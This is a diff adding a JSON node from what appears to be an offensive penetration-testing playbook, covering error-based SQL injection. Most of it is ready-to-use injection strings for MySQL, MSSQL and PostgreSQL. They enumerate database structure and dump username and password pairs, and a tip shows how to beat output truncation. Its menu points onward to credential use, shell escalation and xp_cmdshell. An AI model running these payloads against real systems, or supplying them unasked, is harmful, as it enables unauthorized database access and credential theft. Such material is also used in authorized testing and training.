@@ -1,0 +1,26 @@
+{
+  "id": "sqli_error",
+  "phase": "WEB",
+  "title": "SQLi — Error-Based Extraction",
+  "body": "Error messages leak data directly into the response. Fastest extraction method when available. PortSwigger: use extractvalue() or updatexml() for MySQL, cast() for PostgreSQL, convert() for MSSQL.",
+  "cmd": "# -- MYSQL: extractvalue ------------------\n' AND extractvalue(1,concat(0x7e,(SELECT version())))--\n' AND extractvalue(1,concat(0x7e,(SELECT user())))--\n' AND extractvalue(1,concat(0x7e,(SELECT database())))--\n\n# Enumerate tables\n' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--\n\n# Enumerate columns\n' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--\n\n# Dump credentials (page results with LIMIT)\n' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))--\n' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 1,1)))--\n\n# -- MYSQL: updatexml alternative ---------\n' AND updatexml(1,concat(0x7e,(SELECT version())),1)--\n\n# -- MSSQL: convert -----------------------\n' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--\n' AND 1=convert(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--\n\n# -- POSTGRESQL: cast ---------------------\n' AND 1=cast((SELECT version()) as int)--\n' AND 1=cast((SELECT usename FROM pg_user LIMIT 1) as int)--",
+  "warn": "extractvalue truncates at 32 chars. Use substring() to extract longer values: extractvalue(1,concat(0x7e,substring((SELECT password FROM users LIMIT 0,1),1,30)))",
+  "choices": [
+    {
+      "label": "Got credentials",
+      "next": "creds_found"
+    },
+    {
+      "label": "DB structure mapped — escalate to FILE",
+      "next": "sqli_shell"
+    },
+    {
+      "label": "MSSQL — xp_cmdshell path",
+      "next": "mssql"
+    },
+    {
+      "label": "Output truncating — switch to UNION",
+      "next": "sqli_union"
+    }
+  ]
+}
